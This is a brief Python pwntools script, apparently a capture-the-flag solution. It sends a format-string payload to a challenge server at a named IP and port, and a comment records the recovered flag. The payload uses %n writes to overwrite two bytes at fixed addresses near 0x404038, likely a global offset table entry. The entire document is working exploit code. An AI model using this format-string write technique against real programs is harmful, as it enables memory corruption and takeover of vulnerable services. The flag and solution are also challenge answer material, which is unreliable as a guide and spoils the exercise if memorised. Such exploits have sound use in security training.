#!/usr/bin/env python3

from pwn import remote
from struct import pack

payload = ''
payload += '%182p%10$n'.ljust(16)
payload += '%16213p%11$n'.ljust(16)
payload += pack('Q', 0x404038).decode()
payload += pack('Q', 0x404039).decode()
payload += '\n'

r = remote('140.113.207.240', 8835)
r.recvuntil('Give me some goodies:')
r.send(payload)
r.recvline()
print(r.recvline())

# FLAG{TH1S 1S G0T!}
